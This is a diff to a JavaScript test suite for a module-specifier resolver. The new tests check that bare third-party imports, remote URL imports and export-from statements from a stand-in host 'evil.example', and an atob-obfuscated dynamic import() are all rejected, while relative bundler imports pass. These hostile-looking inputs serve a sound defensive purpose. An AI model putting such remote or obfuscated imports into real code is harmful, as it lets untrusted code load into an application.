@@ -61,9 +61,33 @@ describe("hostModules", () => {
     expect(out).toContain(hostModuleUrls()["@voltius/api"]);
   });
 
-  test("leaves third-party specifiers untouched", async () => {
+  test("rejects a bare specifier the host does not provide", async () => {
     const { resolveHostSpecifiers } = await freshModule();
     const src = `import uPlot from "uplot";`;
+    await expect(resolveHostSpecifiers(src)).rejects.toThrow(/disallowed specifier/);
+  });
+
+  test("rejects a remote URL specifier", async () => {
+    const { resolveHostSpecifiers } = await freshModule();
+    const src = `import x from "https://evil.example/x.js";`;
+    await expect(resolveHostSpecifiers(src)).rejects.toThrow(/disallowed specifier/);
+  });
+
+  test("rejects a remote export-from specifier", async () => {
+    const { resolveHostSpecifiers } = await freshModule();
+    const src = `export * from "https://evil.example/x.js";`;
+    await expect(resolveHostSpecifiers(src)).rejects.toThrow(/disallowed specifier/);
+  });
+
+  test("rejects a dynamic import() with a non-literal specifier", async () => {
+    const { resolveHostSpecifiers } = await freshModule();
+    const src = `const x = await import(atob("aHR0cHM6Ly9ldmls"));`;
+    await expect(resolveHostSpecifiers(src)).rejects.toThrow(/non-literal specifier/);
+  });
+
+  test("still allows a relative specifier left by the bundler", async () => {
+    const { resolveHostSpecifiers } = await freshModule();
+    const src = `import x from "./chunk.js";`;
     expect(await resolveHostSpecifiers(src)).toBe(src);
   });
 
@@ -79,15 +103,15 @@ describe("hostModules", () => {
     expect(await resolveHostSpecifiers(src)).toBe(src);
   });
 
-  test("rewrites only the host specifier in a bundle that mixes both", async () => {
+  test("rewrites the host specifier and leaves a relative specifier in a mixed bundle", async () => {
     const { resolveHostSpecifiers, hostModuleUrls } = await freshModule();
     const src = [
       `import React from "react";`,
-      `import uPlot from "uplot";`,
+      `import util from "./util.js";`,
       `export const x = 1;`,
     ].join("\n");
     const out = await resolveHostSpecifiers(src);
     expect(out).toContain(`"${hostModuleUrls()["react"]}"`);
-    expect(out).toContain(`import uPlot from "uplot";`);
+    expect(out).toContain(`import util from "./util.js";`);
   });
 });
